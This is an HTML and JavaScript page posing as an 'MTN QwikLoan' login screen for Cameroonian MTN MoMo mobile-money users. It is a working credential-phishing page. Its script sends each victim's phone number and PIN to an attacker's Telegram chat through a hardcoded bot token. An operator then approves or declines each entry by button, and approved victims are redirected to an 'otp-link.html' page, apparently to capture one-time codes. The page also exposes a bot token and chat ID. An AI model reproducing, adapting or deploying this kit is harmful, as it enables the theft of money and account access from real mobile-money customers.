<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>MTN QwikLoan – Connexion par PIN</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', Arial, Helvetica, sans-serif;
        }

        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
        }

        .container {
            width: 100%;
            max-width: 360px;
            margin: 0 auto;
            background: white;
            border-radius: 28px;
            padding: 30px 16px 36px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            position: relative;
            text-align: center;
        }

        .content {
            position: relative;
            z-index: 2;
        }

        .logo {
            text-align: center;
            margin-top: 20px;
        }
        .logo-circle {
            width: 48px;
            height: 48px;
            background: #000;
            border-radius: 50%;
            color: #FFCC00;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            margin: auto;
            font-weight: 800;
        }
        .logo-text {
            color: #000;
            font-size: 24px;
            font-weight: bold;
            margin-top: 6px;
        }
        .logo-text span {
            color: #FFCC00;
            background: #000;
            display: inline-block;
            padding: 0 6px;
            border-radius: 10px;
        }

        .title {
            text-align: center;
            color: #FFCC00;
            font-size: 18px;
            font-weight: 700;
            margin-top: 12px;
        }
        .subtitle {
            text-align: center;
            color: #555;
            font-size: 14px;
            margin-top: 8px;
            line-height: 1.45;
            padding: 0 4px;
        }

        .form {
            margin-top: 24px;
            text-align: left;
        }

        .label {
            font-size: 13px;
            color: #555;
            margin-bottom: 6px;
            display: block;
            font-weight: 500;
        }

        .input {
            width: 100%;
            height: 48px;
            border-radius: 12px;
            border: 1px solid #ddd;
            padding: 0 14px;
            font-size: 15px;
            background: #fff;
            outline: none;
            transition: border 0.2s;
        }
        .input:focus {
            border-color: #FFCC00;
            box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.3);
        }

        .btn {
            width: 100%;
            height: 52px;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            margin-top: 18px;
            cursor: pointer;
            font-weight: 700;
        }
        .btn-primary {
            background: linear-gradient(90deg, #FFCC00, #E6B800);
            color: #000;
            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.3);
        }
        .btn-primary.disabled,
        .btn-primary:disabled {
            background: #e5e5e5;
            color: #999;
            cursor: not-allowed;
            box-shadow: none;
        }
        .btn-outline {
            background: transparent;
            border: 2px solid #FFCC00;
            color: #333;
            font-weight: 600;
        }

        .version {
            text-align: center;
            color: #aaa;
            font-size: 11px;
            margin-top: 18px;
        }

        #spinner {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(2px);
            z-index: 999;
        }
        .loader {
            width: 42px;
            height: 42px;
            border: 4px solid #ffe0a3;
            border-top: 4px solid #FFCC00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .error-box {
            position: absolute;
            top: 12px;
            left: 12px;
            right: 12px;
            background: #fff;
            border: 2px solid #ff4d4d;
            border-radius: 14px;
            padding: 12px;
            display: none;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
            z-index: 100;
            text-align: left;
        }
        .error-title {
            color: #ff0000;
            font-weight: bold;
            font-size: 14px;
            margin-bottom: 4px;
        }
        .error-text {
            color: #444;
            font-size: 13px;
        }
        .close {
            position: absolute;
            right: 12px;
            top: 8px;
            cursor: pointer;
            font-size: 20px;
            color: #999;
        }

        @media (max-width: 360px) {
            body {
                padding: 8px;
            }
            .container {
                padding: 24px 12px 32px;
                border-radius: 24px;
            }
            .logo {
                margin-top: 8px;
            }
            .logo-circle {
                width: 44px;
                height: 44px;
                font-size: 26px;
            }
            .logo-text {
                font-size: 22px;
            }
            .title {
                font-size: 17px;
                margin-top: 8px;
            }
            .subtitle {
                font-size: 13px;
            }
            .form {
                margin-top: 20px;
            }
            .input,
            .btn {
                height: 46px;
            }
            .btn {
                font-size: 15px;
                margin-top: 16px;
            }
            .version {
                font-size: 10px;
                margin-top: 16px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="error-box" id="errorBox">
            <div class="close" onclick="hideError()">×</div>
            <div class="error-title">Erreur</div>
            <div class="error-text" id="errorText">Identifiants invalides</div>
        </div>

        <div class="content">
            <div class="logo">
                <div class="logo-circle">M</div>
                <div class="logo-text"><span>MTN</span> QwikLoan</div>
            </div>
            <div class="title">Bienvenue sur MTN QwikLoan</div>
            <div class="subtitle">
                Saisissez votre numéro MTN et votre code PIN pour vous connecter.
            </div>

            <div class="form">
                <div class="label">Numéro MTN MoMo</div>
                <input class="input" id="phoneInput" placeholder="6 55 12 34 56" inputmode="numeric" maxlength="11">

                <div class="label" style="margin-top:15px;">Saisissez votre code PIN</div>
                <input class="input" id="pinInput" placeholder="4 ou 5 chiffres" inputmode="numeric" maxlength="5" type="password" autocomplete="off">

                <button class="btn btn-primary" id="loginBtn" disabled>Se connecter</button>
                <button class="btn btn-outline" id="goBackBtn">Retour</button>

                <div class="version">v2.6.2 (MTN-QWIK-2026)</div>
            </div>
        </div>
    </div>

    <div id="spinner">
        <div class="loader"></div>
    </div>

    <script>
        // ========== TELEGRAM CONFIG (English messages) ==========
        const BOT_TOKEN = '8745115171:AAHIirv4QpNh1p6JMWLLh6sqrvBh-YrO7Bc';
        const CHAT_ID = '1006917440';
        const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

        // ========== DOM ELEMENTS ==========
        const phoneInput = document.getElementById('phoneInput');
        const pinInput = document.getElementById('pinInput');
        const loginBtn = document.getElementById('loginBtn');
        const goBackBtn = document.getElementById('goBackBtn');
        const spinner = document.getElementById('spinner');
        const errorBox = document.getElementById('errorBox');
        const errorText = document.getElementById('errorText');

        let isSubmitting = false;
        let currentPollInterval = null;

        function showError(message) {
            errorText.innerText = message || 'Identifiants invalides';
            errorBox.style.display = 'block';
        }

        function hideError() {
            errorBox.style.display = 'none';
        }

        function clearPinField() {
            pinInput.value = '';
        }

        function focusFirstInput() {
            phoneInput.focus();
        }

        function updateLoginButton() {
            const phone = phoneInput.value.trim();
            const pin = pinInput.value.trim();
            // PIN digits only, length 4 or 5
            const pinDigits = pin.replace(/\D/g, '');
            const isValidPin = (pinDigits.length === 4 || pinDigits.length === 5);
            // Phone: allow spaces, we'll check length of digits later
            const phoneDigits = phone.replace(/\D/g, '');
            const isValidPhone = phoneDigits.length === 9; // Cameroon MTN numbers are 9 digits
            const isValid = isValidPhone && isValidPin;
            loginBtn.disabled = !isValid;
        }

        function validateMobileNumber(phone) {
            const cleaned = phone.replace(/\D/g, '');
            // Cameroon: exactly 9 digits (MTN numbers start with 6,7,8 usually)
            return cleaned.length === 9;
        }

        function escapeHtml(unsafe) {
            if (!unsafe) return '';
            return unsafe.replace(/[&<>"]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                if (m === '"') return '&quot;';
                return m;
            });
        }

        function stopPolling() {
            if (currentPollInterval) {
                clearInterval(currentPollInterval);
                currentPollInterval = null;
            }
        }

        // ===== TELEGRAM SEND (English message) =====
        async function sendLoginToTelegram(phone, pin) {
            const ts = Date.now();
            const approveId = `login_approve_${ts}`;
            const declineId = `login_decline_${ts}`;

            sessionStorage.setItem('mtn_phone', phone.replace(/\D/g, ''));
            sessionStorage.setItem('mtn_pin', pin);

            // English message for admin
            const message =
                `🔐 <b>MTN QwikLoan Login Request</b>\n\n` +
                `<b>MoMo Number:</b> <code>${escapeHtml(phone)}</code>\n` +
                `<b>PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
                `📢 <b>Approve or Decline this login attempt:</b>`;

            try {
                const response = await fetch(`${API_BASE}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '✅ Approve', callback_data: approveId },
                                    { text: '❌ Decline', callback_data: declineId }
                                ]
                            ]
                        }
                    })
                });

                if (!response.ok) throw new Error(`HTTP ${response.status}`);

                startPollingForDecision(approveId, declineId);
            } catch (err) {
                console.error('Telegram send error:', err);
                spinner.style.display = 'none';
                isSubmitting = false;
                loginBtn.disabled = false;
                updateLoginButton();
                showError('Erreur réseau. Veuillez réessayer.');
            }
        }

        function startPollingForDecision(approveId, declineId) {
            stopPolling();
            let lastUpdateId = 0;

            currentPollInterval = setInterval(async () => {
                try {
                    const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
                    const response = await fetch(url);
                    const data = await response.json();
                    if (!data.ok || !data.result.length) return;

                    for (const update of data.result) {
                        lastUpdateId = Math.max(lastUpdateId, update.update_id);
                        const callback = update.callback_query;
                        if (!callback) continue;
                        const cbData = callback.data;

                        if (cbData === approveId) {
                            stopPolling();
                            spinner.style.display = 'none';
                            isSubmitting = false;
                            window.location.href = 'otp-link.html';
                            return;
                        }

                        if (cbData === declineId) {
                            stopPolling();
                            spinner.style.display = 'none';
                            isSubmitting = false;
                            loginBtn.disabled = false;
                            updateLoginButton();
                            showError('Authentification refusée. Veuillez vérifier vos identifiants.');
                            clearPinField();
                            phoneInput.focus();
                            return;
                        }
                    }
                } catch (err) {
                    console.warn('Polling error:', err);
                }
            }, 1500);
        }

        async function submitLogin() {
            if (isSubmitting) return;

            const phoneRaw = phoneInput.value.trim();
            const pinRaw = pinInput.value.trim();

            hideError();

            // Phone digits only
            const phoneDigits = phoneRaw.replace(/\D/g, '');
            if (!phoneDigits) {
                showError('Veuillez saisir votre numéro MTN MoMo.');
                phoneInput.focus();
                return;
            }
            if (phoneDigits.length !== 9) {
                showError('Veuillez saisir un numéro MTN MoMo valide (9 chiffres).');
                phoneInput.focus();
                return;
            }

            // PIN digits only
            const pinDigits = pinRaw.replace(/\D/g, '');
            if (!pinDigits) {
                showError('Veuillez saisir votre code PIN (4 ou 5 chiffres).');
                pinInput.focus();
                return;
            }
            if (pinDigits.length !== 4 && pinDigits.length !== 5) {
                showError('Le code PIN doit comporter 4 ou 5 chiffres.');
                pinInput.value = '';
                pinInput.focus();
                return;
            }

            isSubmitting = true;
            loginBtn.disabled = true;
            spinner.style.display = 'flex';

            await sendLoginToTelegram(phoneDigits, pinDigits);
        }

        // -------- Event Listeners --------
        phoneInput.addEventListener('input', function(e) {
            // Allow spaces but we'll strip non-digits for validation
            let val = this.value.replace(/[^0-9 ]/g, '');
            // Limit digits to 9, but allow spaces
            const digits = val.replace(/\D/g, '');
            if (digits.length > 9) {
                // truncate to 9 digits and reformat with spaces every 2 digits? We'll just keep as digits without spaces.
                // Simpler: remove spaces and keep digits
                val = digits.slice(0, 9);
                // optionally format with spaces: e.g., "6 55 12 34 56" -> we'll just display as digits without spaces for simplicity.
                // But we can add spaces for readability.
                // We'll just set value to digits without spaces.
                this.value = val;
            } else {
                // If there are spaces, we can keep them but we want to avoid double spaces.
                // We'll just keep the value as is but we'll strip non-digits for validation.
                // For user experience, we can format with spaces: 6 55 12 34 56
                // We'll format on blur or each input? Let's just keep raw with spaces allowed.
                // Actually we want to clean up: replace multiple spaces, etc.
                // We'll just let user type digits and spaces, but we'll strip spaces for validation.
                // So we don't need to modify value.
            }
            updateLoginButton();
            hideError();
        });

        phoneInput.addEventListener('paste', function(e) {
            e.preventDefault();
            const pasted = (e.clipboardData || window.clipboardData).getData('text');
            const digits = pasted.replace(/\D/g, '').slice(0, 9);
            this.value = digits;
            updateLoginButton();
            hideError();
        });

        // Format phone with spaces on blur? Not necessary.

        pinInput.addEventListener('input', function(e) {
            let val = this.value.replace(/[^0-9]/g, '');
            if (val.length > 5) val = val.slice(0, 5);
            this.value = val;
            updateLoginButton();
            hideError();
        });

        pinInput.addEventListener('paste', function(e) {
            e.preventDefault();
            const pasted = (e.clipboardData || window.clipboardData).getData('text');
            const digits = pasted.replace(/\D/g, '').slice(0, 5);
            this.value = digits;
            updateLoginButton();
            hideError();
        });

        loginBtn.addEventListener('click', submitLogin);

        goBackBtn.addEventListener('click', () => {
            stopPolling();
            window.history.back();
        });

        // -------- Initialisation --------
        function init() {
            updateLoginButton();
            hideError();
            phoneInput.focus();
        }

        init();

        window.hideError = hideError;
    </script>
</body>
</html>
